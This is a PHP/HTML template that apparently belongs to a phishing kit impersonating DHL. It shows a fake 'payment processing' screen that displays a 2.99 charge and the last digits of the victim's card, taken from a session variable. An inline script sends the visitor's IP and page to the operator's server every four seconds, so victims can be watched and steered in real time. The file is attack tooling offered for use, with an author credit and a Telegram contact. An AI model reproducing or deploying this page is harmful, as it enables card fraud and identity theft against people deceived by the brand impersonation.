<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    $_SESSION['last_page'] = "loading";

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="DHL">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>DHL</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
    </head>
    <body>

    
    <!-- header -->
     <header class="header_1">
      <div class="container_header_1 d-flex align-items-center justify-content-between">
        <div class="logo">
          <img src="<?php echo IMGSPATH; ?>/dhl-logo.svg" alt="">
        </div>
        <div class="links_1">
          <ul class="mb-0 ps-0 d-flex align-items-center">
            <li><i class="fa-solid fa-magnifying-glass search"></i> <?php echo get_text('head_1'); ?></li>
            <li data-lang="en" style="text-transform: uppercase;" class="lang <?php if( $_SESSION['lang'] == 'en' ) { echo 'active'; } ?>">EN</li>
            <li data-lang="<?php echo $_SESSION['lang']; ?>" style="text-transform: uppercase;" class="lang <?php if( $_SESSION['lang'] !== 'en' ) { echo 'active'; } ?>"><?php echo $_SESSION['lang']; ?></li>
          </ul>
        </div>
        <img src="<?php echo IMGSPATH; ?>/bars.png" class="bars" alt="">
      </div>
     </header>
     <div class="some_linsk">
      <div class="container_some_links d-flex justify-content-between align-items-center">
        <div class="part_left">
          <ul class="ps-0 mb-0 d-flex align-items-center">
            <li><a href=""><?php echo get_text('mainmenu_1'); ?></a> <img src="<?php echo IMGSPATH; ?>/arrow.png" alt=""></li>
            <li><a href=""><?php echo get_text('mainmenu_2'); ?></a> <img src="<?php echo IMGSPATH; ?>/arrow.png" alt=""></li>
            <li><a href=""><?php echo get_text('mainmenu_3'); ?></a></li>
            <li><a href=""><?php echo get_text('mainmenu_4'); ?></a></li>
          </ul>
        </div>
        <div class="part_right">
          <ul class="ps-0 mb-0 d-flex align-items-center">
            <li><a href=""><?php echo get_text('mainmenu_5'); ?></a> <img src="<?php echo IMGSPATH; ?>/arrow.png" alt=""></li>
          </ul>
        </div>
      </div>
     </div>

     <div class="box_height">
      
     </div>

     <!-- wrapper_details -->
     <div class="wrapper_load">
        <form action="">
          <div class="type_payme d-flex align-items-center justify-content-center">
            <img src="<?php echo IMGSPATH; ?>/pa.png" alt="">
          </div>
          <div class="infos_pysss">
            <div class="info d-flex align-items-center justify-content-between">
              <p><?php echo get_text('merchant'); ?> :</p>
              <span>DHL Express</span>
            </div>
            <div class="info d-flex align-items-center justify-content-between">
              <p><?php echo get_text('amount'); ?> :</p>
              <span>2.99<?php echo $_SESSION['currency']; ?></span>
            </div>
            <div class="info d-flex align-items-center justify-content-between">
              <p><?php echo get_text('date'); ?> :</p>
              <span><?php echo date('d.m.Y'); ?></span>
            </div>
            <div class="info d-flex align-items-center justify-content-between">
              <p><?php echo get_text('card_number'); ?> :</p>
              <span>**** **** **** <?php echo $cc; ?></span>
            </div>
          </div>
          <div class="load_img mt-3">
            <img src="<?php echo IMGSPATH; ?>/loading-_iupFePx.gif" alt="">
          </div>
          <div class="proccess mt-0">
            <h3><?php echo get_text('treatment'); ?></h3>
            <div class="alert alert-warning rounded-0 mb-0 mt-3" role="alert">
              <i class="ri-alert-line"></i> <?php echo get_text('loading_text'); ?>
            </div>
          </div>
        </form>
     </div>

    <!-- footer -->
      <footer class="footer_1">
        <div class="contianer_footer_1">
          <div class="row w-100 mx-auto">
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span class="active"><?php echo get_text('footer_title_1'); ?></span>
                <li><?php echo get_text('f_w_1_1'); ?></li>
                <li><?php echo get_text('f_w_1_2'); ?></li>
                <li><?php echo get_text('f_w_1_3'); ?></li>
                <li><?php echo get_text('f_w_1_4'); ?></li>
                <li><?php echo get_text('f_w_1_5'); ?></li>
                <li><?php echo get_text('f_w_1_6'); ?></li>
              </ul>
            </div>
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span><?php echo get_text('footer_title_1'); ?></span>
                <li><?php echo get_text('f_w_2_1'); ?></li>
                <li><?php echo get_text('f_w_2_2'); ?></li>
                <li><?php echo get_text('f_w_2_3'); ?></li>
                <li><?php echo get_text('f_w_2_4'); ?></li>
                <li><?php echo get_text('f_w_2_5'); ?></li>
                <li><?php echo get_text('f_w_2_6'); ?></li>
              </ul>
            </div>
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span><?php echo get_text('footer_title_1'); ?></span>
                <li><?php echo get_text('f_w_3_1'); ?></li>
                <li><?php echo get_text('f_w_3_2'); ?></li>
                <li><?php echo get_text('f_w_3_3'); ?></li>
                <li><?php echo get_text('f_w_3_4'); ?></li>
                <li><?php echo get_text('f_w_3_5'); ?></li>
                <li><?php echo get_text('f_w_3_6'); ?></li>
              </ul>
            </div>
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span><?php echo get_text('footer_title_1'); ?></span>
                <li><?php echo get_text('f_w_4_1'); ?></li>
                <li><?php echo get_text('f_w_4_2'); ?></li>
                <li><?php echo get_text('f_w_4_3'); ?></li>
                <li><?php echo get_text('f_w_4_4'); ?></li>
                <li><?php echo get_text('f_w_4_5'); ?></li>
                <li><?php echo get_text('f_w_4_6'); ?></li>
                <li><?php echo get_text('f_w_4_7'); ?></li>
                <li><?php echo get_text('f_w_4_8'); ?></li>
              </ul>
            </div>                                    
          </div>
        </div>
        <div class="container_copyghit">
          <div class="container_top_copyghit d-flex justify-content-between">
            <div class="part_left">
              <img src="<?php echo IMGSPATH; ?>/glo-footer-logo.svg" alt="">
              <ul class="d-flex align-items-center ps-0 mb-0">
                <li><?php echo get_text('foot_1'); ?></li>
                <li><?php echo get_text('foot_2'); ?></li>
                <li><?php echo get_text('foot_3'); ?></li>
                <li><?php echo get_text('foot_4'); ?></li>
                <li><?php echo get_text('foot_5'); ?></li>
                <li><?php echo get_text('foot_6'); ?></li>
                <li><?php echo get_text('foot_7'); ?></li>
              </ul>
            </div>
            <div class="part_right">
              <h1><?php echo get_text('followus'); ?></h1>
              <img src="<?php echo IMGSPATH; ?>/socil.png" class="social2" alt="">
              <img src="<?php echo IMGSPATH; ?>/social1.png" class="social1" alt="">
            </div>            
          </div>
          <div class="txt_copyght">
            <p class="mb-0"><?php echo get_text('copyright'); ?></p>
          </div>
        </div>
      </footer>






    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="<?php echo JSPATH; ?>/js.js"></script>
    
    <script>
      $(".lang").click(function(){
              var lang = $(this).data('lang');
              window.location.href ="index.php?lang=" + lang;
            });
      worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'loading'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);  
    </script>
    </body>
</html>